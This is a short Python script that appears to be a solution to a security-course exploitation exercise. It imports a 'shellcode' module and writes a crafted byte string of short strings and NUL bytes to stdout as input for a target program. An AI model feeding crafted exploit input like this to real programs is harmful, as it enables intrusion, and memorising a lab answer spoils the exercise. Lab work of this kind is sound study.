#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
sys.stdout.buffer.write(b"fz8")      # 4 chars (4 + 1 NUL)
sys.stdout.buffer.write(b"\x00"*7)   # 7 chars (7 NULs)
sys.stdout.buffer.write(b"A+")       # 3 chars (2 + 1 NUL)
